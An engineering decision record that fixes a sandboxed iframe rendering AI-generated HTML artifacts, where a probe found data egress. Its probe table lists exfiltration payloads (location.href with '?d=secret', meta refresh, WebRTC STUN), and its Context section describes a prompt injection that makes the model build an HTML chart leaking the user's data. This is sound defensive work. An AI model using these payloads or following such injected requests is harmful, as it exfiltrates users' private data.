# ADR 1017 — interactive artifact script consent and chat surfacing

Status: implemented on `feat/fl2-67-interactive-artifacts` (#5428, pending merge). Accepted after an adversarial /architect pass 2026-10-31 (3 Blockers + 7 Majors folded into D1–D5); the closing code and UX grades' Blockers are folded in below.

Feature loop round 2, row 67 — Interactive artifacts (`interactive-artifacts`,
ADR 0128 / 0069 / 0055 / 0708 / 0996). Graded on `origin/main` `a44770019`. Gap ids
continue the earlier passes with the row prefix `IA67`.

## Context

Round 1 closed this feature at A− (ADR 0708). Every grade on it repeats one claim:
the HTML frame is *"the strongest untrusted-content isolation in the app — opaque
origin, `allow-scripts` only, a no-egress CSP"*. The code says the same thing in
four places (`SandboxedArtifactFrame.tsx` header, `ARTIFACT_CSP` comment, the
workbench hint "rendered in an isolated, **no-network** sandbox" in four locales,
and the Visualizer prompt "the canvas is origin-isolated **with no egress**").

### M1 — the frame has egress (measured)

A headless-Chromium probe (Playwright 1.5x, the repo's `frontend/react`
install) put each payload in an `<iframe sandbox="allow-scripts">` whose `srcdoc`
is exactly `buildArtifactSrcdoc(body)`, with a local HTTP and UDP listener:

| Payload | `sandbox="allow-scripts"` (today) | `sandbox=""` |
|---|---|---|
| `fetch(url)` | blocked | blocked |
| `<img src=url>` | blocked | blocked |
| `location.href = url?d=secret` | **request received** | blocked |
| `<meta http-equiv=refresh content="0;url=…?d=secret">` | **request received** | blocked |
| `new RTCPeerConnection({iceServers:[{urls:'stun:…'}]})` | **4 UDP packets received** | blocked |
| `window.open(url)` | blocked | blocked |
| `top.location = url` | blocked | blocked |

CSP has no directive that governs a frame navigating *itself* (`navigate-to` was
removed from CSP3), and Chromium does not apply `connect-src` to WebRTC ICE. So the
null origin holds (the frame cannot read the parent, cookies or storage), but the
frame **can send anything it contains to any host, with no click**. What it
contains is model output, and the model writes it from the conversation. A prompt
injection in a KB document, a web page or an email the model read can therefore
ask for "a chart of the user's data, as HTML", and the artifact leaks it the
moment someone opens the preview. The same frame renders a document's
`embedBlock` (`EmbedNodeView.tsx`), which another workspace member authored and
which runs in every reader's browser.

This is a false security claim on an untrusted-content surface, so it is a
Blocker, not an Improvement. It is not a regression: the frame has had this
property since ADR 0128 Phase 2.

### M2 — the artifact never reaches the chat (code read, confirmed by the UX scout)

The Visualizer's prompt says the artifact is *"rendered live in the chat artifact
workbench … do not paste the raw source into the chat reply — the workbench
renders it"*. Nothing opens it. The feed shows a generic tool row
(`AgentEventCards.tsx:101`) built from `agent.toolCalled` / `agent.toolReturned`,
which carry no result payload (an RFC change). `workbench.openArtifact` has three
callers, none reached by a chat tool. The string `chat-viz` occurs nowhere in
`frontend/react/src`. The only way to see a rendered visual is to go to `/library`
and find it. So the agent is told to withhold the source, and the user gets
"I made you a chart" with nothing to look at. The code-exec chat tool (`chat-code:`
lane, ADR 0996) has the same gap.

### M3 — the render tool reports a type it did not store (code read)

`openwop:interactive-artifacts.render` runs the pack node, then
`persistRunArtifact`. The node checks only `typeof chartType === 'string'`; the
registered schema (ADR 0708 D2) closes it to `bar | line`. A `pie` chart passes the
node, fails `detectTypedArtifact`, is logged `run_artifact_typed_invalid` and
**stored as an untyped JSON blob** (`runArtifactStore.ts` step 4). The tool then
returns success with `artifactTypeId: "interactive.chart"`, read from the node's
output, not from what was stored. The model is told it made a chart. This is the
"invalid model output is a typed failure, never success" non-negotiable, on the
lane ADR 0708 did not reach: 0708 fixed the *schema*, and the tool never consults
it.

The same holds for an over-cap payload: `persistRunArtifact` returns `null` and the
tool says `persist_failed` with no reason the model can act on.

### M4 — conversation-derived ids in model text (code read)

The render tool's result carries `artifactKey`, `artifactId` and `revisionId`; the
get tool echoes `artifactKey`; the code-exec chat tool returns `artifactId` and
`artifactKey`. Every one embeds `chat-*:<tenantId>:<bucket>`, where the bucket is
the conversation id or `user:<actingUserId>`. This is host-authored model text that
names the tenant and the conversation.

> **Corrected by the /architect pass.** The first draft said this breaks the ADR
> 1002 replay digest. Mostly it does not: a fork keeps `chatSessionId`
> (`conversationToolLoop.ts:520`, `pairStores.ts:52`), so the conversation bucket
> is the same on both sides. The digest only diverges on the `user:` bucket, when
> the person forking is not the person who ran the turn. D4 stands as model-text
> hygiene plus that case.

Only the content hash (`render:<sha12>`) is needed to read the artifact back.

### M5 — the node accepts a chart nothing can draw (code read)

The `render` node in a workflow run has the same gap as M3, minus the false
success message: a `pie` chart, or `data: {}`, succeeds and persists as an untyped
blob that the workbench shows as raw JSON.

> **Corrected during implementation.** The /architect pass reported that
> `{chartType:'bar', data:{}}` crashes the renderer at `ChartRenderer.tsx:72`
> (`chart.series[0]!`). It does not: `parse()` returns `null` when there is no
> series (`ChartRenderer.tsx:39`), so the raw view is shown and line 72 is never
> reached with an empty `series`. The renderer is left unchanged.

### M6 — the plugin frame has the same egress (code read, out of scope)

`features/ui-plugins/PluginFrame.tsx:42` is also `sandbox="allow-scripts"` behind a
`default-src 'none'` header CSP, and its UI says "no network requests"
(`ui-plugins/i18n/en.ts:16`). M1 applies to it unchanged, and
`community.openwop.artifact-viewer` holds `hostApi:["artifact.read"]`. Plugins need
scripts, so D1's cure does not fit. RFC 0117's `frontend-plugin-egress` invariant
("a CSP that denies network egress") is met in letter and not in substance. This
ADR files it (`IA67-6`) and does not fix it.

## Decision

**D1 — Scripts are off until the viewer runs them, and the static view cannot be
clicked.**
- `SandboxedArtifactFrame` renders static by default: `sandbox=""` **and** the
  `inert` attribute on the iframe. The /architect probe measured that `sandbox=""`
  alone still sends a link's URL on one click or Tab+Enter (sandboxed frames may
  always navigate themselves), and that the content can draw its own fake
  "Run scripts" button to get that click. `inert` blocks both pointer and keyboard;
  `pointer-events:none` alone does not.
- The **Run scripts** control lives in the parent, outside the frame, next to a
  notice saying that scripts in this content can send what it contains to other
  sites. It is described by that notice (`aria-describedby`), and focus moves to
  the frame after it runs.
- Running remounts the iframe (a new React `key`): Chromium reads `sandbox` flags
  only at navigation, so changing the attribute in place does nothing.
- Consent is per view and keyed by a `consentKey` the caller passes. It is never
  persisted.
  - Workbench: `ArtifactRendererProps` gains `consentKey`. The workbench passes
    `${artifactId}:${revisionId}`, so a different artifact or revision starts
    static. The live-edit draft keeps the key of the artifact being edited, so the
    viewer's own typing does not re-prompt. `editing` resets when the revision
    changes as well as the artifact, so a new revision never inherits a draft's
    consent.
  - Document embed (`EmbedNodeView`): key is the embed HTML, so a peer's edit
    starts static again.
  - Embed editor (`EmbedEditModal`): key is stable for one open of the modal and
    starts static, so the author can preview their own typing after one consent.
- Static content gets a text alternative: the frame stays titled, and the workbench
  already has a Raw tab with the source.
- `ARTIFACT_CSP` and the null origin stay. They still hold `fetch`, images, fonts,
  resource hints, nested frames, forms, popups and top navigation (all measured
  blocked under `sandbox=""`).
- What changes in the claim: **no egress while static; with scripts running, the
  content can reach the network.** Corrected everywhere it was false: the frame
  header, `defaultRenderers.tsx:9`, `ArtifactWorkbench.tsx:154`,
  `runArtifactStore.ts:197`, `EmbedNodeView.tsx:5`, `embedBlock.ts:5`,
  `EmbedEditModal.tsx:5`, the node pack header (`index.mjs:15`), the workbench hint
  and the `embedNote` / `embedDefaultHtml` strings in every locale that has them,
  the Visualizer prompt, and an inline correction note in ADR 0128. Copies of the
  old `embedDefaultHtml` already saved inside documents cannot be corrected; they
  are user content now.

**D2 — A chat tool's artifact appears under the turn that made it.**

> **Corrected by the /architect pass (B1).** The first draft keyed this on
> `scope.runId` as "the turn's run id". It is not: an RFC 0005 chat is one
> long-lived run (`useTurnTransport.ts:275`, `conversationExchange.ts:689`), so
> every artifact in a conversation would have shown under every turn. And the
> frontend's `message.meta.runId` is absent on turns rebuilt from the wire.

- The exchange already reserves the agent turn's index before dispatch. It passes
  that turn's wire message id (`turnMessageId(conversationId, agentIndex, 'agent')`,
  deterministic) down the tool scope as `turnMessageId`, beside `onRunDispatched`.
  Transports without a turn (voice, the run-lane `agentDispatch`) pass none.
- `persistRunArtifact` takes an optional `turnMessageId` and stores it on the row.
  The two chat tools pass it.
- `GET /host/openwop-app/artifacts?conversationRunId=<runId>&turnMessageId=<id>`
  (host extension, no wire change):
  - resolves the run;
  - derives the two chat-tool runIds from the run's own `chatSessionId` stamp with
    the ONE builder (`chatArtifactRunId`);
  - lists those two prefixes and keeps rows whose `turnMessageId` matches;
  - passes every row through `getArtifact`, the gate of `GET /artifacts/:id`.
  A missing run, a run of another tenant, a run with no chat session and an
  unreadable row all answer the same `200 { artifacts: [] }`. That leaves no
  existence oracle.
- The SPA stamps each assistant message rebuilt from a wire turn with
  `turnRef: { conversationRunId, turnMessageId }` (the raw wire id, before
  `conversationMessageId` sanitizes it). Once the turn settles, and the turn called
  `openwop:interactive-artifacts.render` or the code-exec chat tool without an
  error, `TurnReceipt` lists that turn's artifacts with the existing
  `RunArtifactCards`, **outside** the receipt's collapsed details. A card opens the
  docked Workbench through `WorkbenchActions.openArtifact`, added beside
  `openSources` in both shells (`ChatSidebar`, `TabChatDeck`). A shell without a
  Workbench provides no actions and shows no cards.
- The Visualizer prompt says what is now true: a card under the reply opens the
  visual.

**D3 — The render tool fails typed and reports what it stored.**
- `runArtifactStore` exports the check `detectTypedArtifact` already runs, as
  `checkTypedArtifact(value)`: `{ ok: true }`, or `{ ok: false, code, errors }`
  with `typed_invalid` + the Ajv messages, `too_large` + the cap, or
  `type_unregistered`. `detectTypedArtifact` calls it, so there is one validator.

  > **Corrected at implementation (code grade #10).** `detectTypedArtifact` does NOT
  > call it: the too-large check lives later, in `persistRunArtifact`, and making
  > `detectTypedArtifact` refuse a too-large payload would send it down the untyped
  > path instead of declining it. `checkTypedArtifact` runs the same three checks in
  > the same order, beside it, and the tool also reads the stored type back. Two
  > readers of one rule, kept adjacent in `runArtifactStore.ts`.
- The tool runs the check on the node's output before persisting and returns a
  typed `isError` on refusal. The bounded repair is the agent loop's existing error
  feedback.
- After persisting, the tool reads the row back and fails if its `artifactTypeId`
  is not the one requested. That catches every other way the store can decline the
  typed path.

**D4 — Model text is run- and tenant-independent.**
- The render result returns `handle: "render:<sha12>"`, `artifactTypeId` and
  `title`, and drops `artifactKey` / `artifactId` / `revisionId`. The code-exec
  chat tool drops `artifactKey` / `artifactId` the same way. The get tool stops
  echoing the key.
- The get tool's `artifactKey` input accepts the handle and resolves it under the
  caller's own `chatArtifactRunId('chat-viz', scope)`. A legacy full key is
  accepted only when it parses to a `chat-viz:` key of the caller's own tenant.
- **Corrected by the /architect pass (B3):** both paths read through
  `getArtifact(tenant, actingUserId, 'run-event:' + key)`, the Library's gate,
  before returning content. The old check (`record.tenantId` plus
  `canReadChatArtifact`, which answers `true` for any non-chat row) let the tool
  read any workflow-run artifact in the tenant by key, including those of client
  orgs the caller cannot read.

  > **Corrected by the code grade (B1).** `getArtifact` asks membership only, so
  > outside demo mode the owner of a personal `user:`/`anon:` tenant, who has no
  > member row, was refused their own artifact. The tool now asks
  > `canReadChatToolArtifact` (`host/artifactProjection.ts`): org read by membership,
  > or the implicit owner of the caller's own personal tenant (`personalTenant`,
  > run-stamped, the `assertOrgScope` ADR 0622 D2 exit, keyed on ownership rather
  > than the tenant's shape), then the conversation rule. That is wider than
  > `GET /artifacts/:id` by exactly that owner. The D2 route stays on `getArtifact`,
  > the gate a card's click opens, so a card is never listed that cannot open.
  > `GET /artifacts/:id` and the Library refusing that owner outside demo mode is
  > filed as `IA67-8`; fixing it should make all three this one predicate.
  >
  > **And (code grade #4):** `reused` is gone from the result. It depended on store
  > state, so a replay fork that re-ran the call read `true` where the source run
  > read `false`, and the next round's digest changed. Identical calls now return
  > byte-identical text.
**D5 — The node, the schema and the renderer agree on what a chart is.**
- `render` refuses a `chartType` outside `bar | line` and a `data` without a
  non-empty `datasets` array whose items each carry a `data` array, as a typed
  `validation_error`. The node pack cannot import the host schema, so its list is
  pinned to `CHART_TYPES` by the existing parity test.
- The `interactive.chart` schema requires the same: `datasets` with `minItems: 1`,
  each item `required: ['data']` with `data` an array. Every emitter is held to it.
  BI's `run-metric` already emits one dataset of numbers.
- No wire change: `artifactTypesAdvert` publishes facets, not schema bodies
  (`discovery.ts:1199-1260`), and `schema.lookup` is generated from the registry.
  The parity test also pins `datasets` in the Visualizer prompt.

## Alternatives weighed

- **Detect a frame navigation and tear the frame down (`onLoad` count).** The
  request has already left by the time the parent sees the load, and the probe saw
  a self-navigation with no second `load`. Rejected as the control.
- **`sandbox=""` without `inert`.** Leaks on one click (measured). Rejected.
- **Serve artifacts from a separate origin with a header CSP.** No header governs a
  frame's own navigation or WebRTC either, and it adds a deployable. Rejected.
- **Inject a guard script that deletes `RTCPeerConnection` and traps `location`.**
  `location` is unforgeable and a nested `srcdoc` frame gets fresh globals.
  Rejected.
- **Sanitize the HTML instead of a static sandbox.** A second security boundary to
  keep correct; the sandbox flags are the browser's own and are witnessed. Rejected.
- **Key cards on the tool `callId`.** Not unique: Gemini ids are
  `gemini-<name>-<n>` and MiniMax inline ids `minimax_inline_<n>`, both reset every
  round (`providers/dispatchProviderTools.ts:52,365`). Rejected.
- **Materialize an artifact turn, like `workflow_run`, through the turn collector.**
  Exact, and it also covers reuse. But a new turn kind reaches every turn consumer
  (chat export, arena, search, the channel mirror), and `asText` would
  JSON-stringify it, artifact id included, into model history, which is what D4
  removes. Rejected for this ADR; the row stamp needs no turn-shape change.
- **Emit `artifact.created` on the conversation run.** Couples replay to a
  chat-tool side effect. Rejected.

## Trade-offs

- Interactive HTML costs one click to run, every time it is opened, and static HTML
  can be neither scrolled nor clicked. That is the price of the claim being true.
- An identical re-render in a later turn reuses the first row (the key is the
  content hash; the write is insert-only), so its card stays on the first turn.
  The prompt tells the model that the same content returns the same artifact.
- `turnMessageId` is stamped only on rows written after this change. Older chat
  artifacts stay reachable through `/library` only.

## Phases

| Phase | Scope | Gaps | Tests that change |
|---|---|---|---|
| P1 | D1 frame consent, `inert`, remount, consentKey through the renderer registry and both embed consumers; every claim correction | `IA67-1` | `SandboxedArtifactFrame.test.tsx`, `ArtifactWorkbench.test.tsx`, embed tests |
| P2 | D3 + D4: `checkTypedArtifact`, render/get/code-exec tool outputs, getArtifact gate | `IA67-3`, `IA67-4`, `IA67-7` | `interactive-artifacts-agent-tools`, `ce62-f1-chat-artifact-privacy`, `code-exec-gates` (all read `artifactKey`) |
| P3 | D5 node + schema + renderer, pack bumps | `IA67-5` | `artifact-typed-invalid-observable` (its valid control is `data:{}`; rewritten, not deleted), `interactive-artifact-types` (`datasets: []` was valid), `interactive-artifact-producer` (phantom `{labels, values}` shape), `promptCatalogParity` |
| P4 | D2 `turnMessageId` scope + row + route + SPA `turnRef` + `TurnReceipt` cards + prompt | `IA67-2` | new route + receipt tests; `manual-tests/suites.ts:1022` |

## Boundaries audit and evaluation matrix

An **extension** of `interactive-artifacts` (always-on since ADR 0134; no toggle is
added). Single owners, composed rather than forked:

- Artifact rows: `host/runArtifactStore.ts` (`persistRunArtifact`, the one writer).
- Chat-tool visibility: `host/chatArtifactScope.ts` (`chatArtifactRunId`,
  `canReadChatArtifact`, ADR 0996). No second visibility rule.
- Artifact reads: `features/documents/artifactRoutes.ts` `GET /artifacts` already
  takes `?runId=` (ADR 0768); `?conversationRunId=&turnMessageId=` is a second filter on the same route,
  registered in the same handler, so there is no route collision.
- Turn cards: `chat/RunArtifactCards.tsx` (`RunArtifactCards`, `useRunArtifacts`),
  reused; `chat/workbench/workbenchActions.tsx` gains `openArtifact`.
- The frame: `chat/artifacts/SandboxedArtifactFrame.tsx`, shared by the workbench and
  `document-editor/EmbedNodeView.tsx`. One control, both consumers.

| # | Dimension | Decision |
|---|---|---|
| 1 | Feature package | No new package. Backend edits in `features/interactive-artifacts/`, the host artifact store, the artifact route; frontend in `chat/`. |
| 2 | Toggle | None (always-on feature, ADR 0134). The script consent is a per-view user act, not a toggle. |
| 3 | `ctx.<feature>` surface | None, unchanged. |
| 4 | Node pack | `feature.interactive-artifacts.nodes` → 1.0.2 (D5); no new node. |
| 5 | Envelopes | None. |
| 6 | Agent pack | `vendor.openwop-app.interactive-artifacts.agents` → 1.0.3: prompt corrected (D1, D2, D4). Tool allowlist unchanged. |
| 7 | Public surface | None. No artifact is publicly reachable (the scout confirmed no share type renders the frame). |
| 8 | RBAC | `?conversationRunId=&turnMessageId=` answers `200 []` alike for a missing, foreign or unreadable run and routes every row through `getArtifact` (the Library gate, incl. conversation read). The get tool asks the same questions plus the own-personal-tenant owner exit (`canReadChatToolArtifact`); its handle resolves only inside the caller's own bucket. |
| 9 | Replay / fork | D4 removes the tenant- and conversation-derived ids from model text. `turnMessageId` is a display link only; nothing replays from it. |
| 10 | Frontend | `SandboxedArtifactFrame` consent control, `TurnReceipt` cards, four-locale strings, tokens only. |

## RFC gate

None. Every change is host-local: a host-extension route under
`/v1/host/openwop-app/*`, a host-registered artifact schema, a host node pack, the
SPA. No run-event field, capability or endpoint contract changes.

The plugin-frame egress (M6) is NOT fixed here, and it does touch a spec invariant:
RFC 0117's `frontend-plugin-egress` says the plugin CSP denies network egress, and
M1's measurement shows a CSP cannot. That needs an issue or erratum in
`../openwop` (filed as `IA67-6`, routed to the lead), not a host change in this ADR.

## Open questions

- [ ] Should a workspace admin be able to allow scripts by default for its own
  members' embeds? Not in this ADR; it needs a toggle and a product call.
- [ ] `IA67-6` — the plugin frame (M6): an RFC 0117 issue, then a ui-plugins ADR.
- [ ] Should a reused render (identical content in a later turn) also show its card
  on the later turn? Needs a turn-link store or an artifact turn kind; deferred.

## Closing grades and what they changed (2026-10-31)

Independent `/grade-code` (B) and `/grade-ux` (C+) passes ran over the first cut.
Their Blockers, all fixed in this PR:

| Grade finding | Fix |
|---|---|
| Code B1: `get` refused a personal-tenant owner outside demo mode | `canReadChatToolArtifact` with the `personalTenant` exit (D4 note above); witnessed with `OPENWOP_DEMO_MODE=false`, no member row |
| Code B2: cards existed only in the session that streamed the turn | the merge keeps every reply's tool cards across rebuilds and seeds them from restored messages (the store keeps the whole message); reopen witness in `useChatSession.integration.test.tsx` |
| Code B3: e2e legs that could not fail | positive controls (RUNNING self-navigation, meta refresh, WebRTC reach the sinks) and a TCP-connection count beside HTTP requests |
| Code #4: `reused` made model text depend on store state | removed; identical calls return identical text |
| Code #6: tool cards could land on the run turn a tool ignited | the reply is the agent turn right after the exchange's newest user turn |
| Code #7: nothing tied the stamped id to the persisted turn | ONE `agentIndex` in `finishExchange` feeds both the tool scope and `makeTurn` |
| UX B1: the inert static frame was empty to screen readers | an `sr-only` text alternative, parsed with `DOMParser` (no script, no resource), scripts and styles stripped |
| UX: the running warning understated the leak; the static note hid that it cannot scroll | copy in four locales |
| UX: no status announcement; small touch targets; duplicated embed note; the note named a button that does not exist | `role="status"`, `aria-describedby` on both buttons, default-size buttons, an author-facing `embedNote` naming "Run scripts", the textarea described by the note |
| UX: a failed card read vanished; the list was labelled "Outputs of this run" | a warning `Notice` with a retry; "Artifacts from this reply" |
| UX: the prompt promised cards where none render | the prompt says cards show in the full chat, and every artifact is in the Library |
| Code #12: Mermaid's `sandbox=""` frame still took a click | `inert` on the Mermaid frame too; its figcaption is the text alternative |
| UX re-grade (B+): "Run scripts" offered for content with no scripts or links | the bar says the static preview shows all of it and offers no Run (`hasInteractiveContent`, a prompt heuristic only: it can hide the button, never widen the sandbox) |
| UX re-grade: an inert Mermaid frame capped at 1200px clipped tall diagrams | the frame takes the whole diagram (guard 8000px) inside a focusable, named, scrolling figure |
| UX re-grade: the text alternative dropped `img[alt]`; it re-parsed on every keystroke; N embeds mounted N live regions | `alt` text appended; parsed from a 300 ms settled body; the note becomes a live region only after the viewer toggles it |
| UX re-grade: the cards' subtitle was the raw `kind · format`; Try again was small | the localized type label (`artifactKindLabel`, moved to `artifacts/artifactKind.ts` so the eager cards do not pull the Library into the entry chunk: +45 B gzip total for this ADR, 87 B of entry headroom left); default-size Try again |
| Lead: does the consent disclose the network? | yes, BEFORE consent now: the static note, which describes the Run button, says running lets the content send itself and anything typed into it to other sites. Post-consent egress is a disclosed trade-off, not a fix |

## Residue (filed, not fixed here)

- [ ] `IA67-8` — `GET /artifacts/:id` and the Library list refuse the owner of a
  personal tenant outside demo mode (`resolveRunArtifact` asks membership only), so
  on such a deploy that owner gets no chat-turn cards either (the D2 route uses the
  same gate, so a card never 404s). Fixing the shared projection needs
  `personalTenant` threaded through every artifact read; it is wider than this
  feature. **Ranked first:** on such a deploy D2 does not work at all for a
  personal-tenant chat. It depends on `OPENWOP_DEMO_MODE`: app.openwop.dev runs with
  `OPENWOP_DEMO_MODE=true` (read from the live service spec, 2026-10-31), so prod owners
  get cards; white-label and other non-demo deploys do not.
- [ ] `IA67-6` — the ui-plugins `PluginFrame` has the same egress (M6), against RFC
  0117's `frontend-plugin-egress` invariant. Needs an openwop issue, then a
  ui-plugins ADR. Plugins need scripts, so D1's cure does not apply.
- [ ] `IA67-9` — if a tool turn renders and the loop then fails, nothing is
  persisted and the next exchange reuses the same agent index, so the artifact shows
  under the next reply. Rare (a successful tool call followed by a loop failure).
  Fix: stamp after the turn persists, or add the exchange key to the stamp.
- [ ] `IA67-10` — `dns-prefetch` is not probed by the e2e (it needs a resolver). CSP
  has no directive over it; whether `inert` + `sandbox=""` stops it is unmeasured. Same residue: `preconnect` (see `IA67-16`).
- [ ] `IA67-11` (UX, Nice) — the sandbox chip explains itself only in a `title`; no
  loading skeleton for the turn's cards; the card meta shows the raw untranslated
  `kind · format` (shared `RunArtifactCards`, also under workflow runs); the srcdoc
  sets no `color-scheme` (a white island in dark mode); embeds carry the full bar.
  Each is polish, not a correctness or safety gap.
- [ ] `IA67-12` (UX, pre-existing) — charts have no data-table alternative; a chart
  is announced only by type and counts.
- [ ] `IA67-13` (Code, Nice) — the render tool fails in two shapes (`{error,
  detail}` from the node, `{error, message, errors}` from the schema check).
- [ ] `IA67-14` (Code, Improvement) — the chat-turn listing prefix-reads every row of
  the conversation's two chat-tool lanes and filters `turnMessageId` in memory, then runs
  the full `getArtifact` gate (org + conversation read) per matching row, unmemoized.
  Bounded today by one conversation's chat-tool artifacts (prod has 0) and gated only
  for the rows of the one turn, so it is cheap; a per-turn key or index, and a memo for
  `canReadChatArtifact`, are the fix when conversations grow.
- [ ] `IA67-15` (Code, Improvement) — no exchange-level test asserts the stamped
  `turnMessageId` equals the persisted agent turn's `messageId`; equality is structural
  (one `agentIndex` in `finishExchange`). The pre-existing allocator gap `EXCH-ALLOC-1`
  has the same shape.
- [x] Code #10 ("one validator") — fixed by correcting the ADR text (D3 correction note):
  the two readers are kept adjacent on purpose.
- [ ] `IA67-16` (Test, Nice) — the e2e's TCP counter has no positive control for a bare
  socket with no request (`preconnect`); self-navigation proves the counter is live.
  > **Measured by ADR 1021 (2026-10-31):** worse than an uncontrolled leg. Chromium
  > 148 opened no preconnect socket to the loopback sink even from an unsandboxed
  > page, so `preconnect` is NOT observable in this harness and is uncovered, not
  > merely uncontrolled. The spec's header comment is corrected; its logic is
  > unchanged. Covering it needs a non-loopback sink (e.g. `--host-resolver-rules`),
  > which belongs with `IA67-10`.
